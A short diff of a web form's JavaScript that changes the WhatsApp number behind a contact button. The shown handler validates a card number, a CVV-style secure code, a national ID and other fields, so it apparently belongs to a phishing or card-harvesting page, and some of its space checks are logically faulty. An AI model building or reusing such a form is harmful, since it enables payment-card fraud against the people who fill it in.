@@ -10,7 +10,7 @@ let error = document.getElementById("error")
 
 
 contact.addEventListener("click", ()=>{
-  location.href = "https://api.whatsapp.com/send?phone=5359398368"
+  location.href = "https://api.whatsapp.com/send?phone=5491151109790"
 })
 submit.addEventListener("click",()=>{
   if(user.value.trim().indexOf(" ") == -1 && user.value.trim().length >4 && card.value.trim().indexOf(" ") && card.value.trim().length == 16 && code.value.trim().indexOf(" ") && code.value.trim().length > 6 && dni.value.trim().indexOf(" ") && dni.value.trim().length > 8 && date.value.trim().indexOf(" ") && secureCode.value.trim().indexOf(" ") && secureCode.value.trim().length == 3){
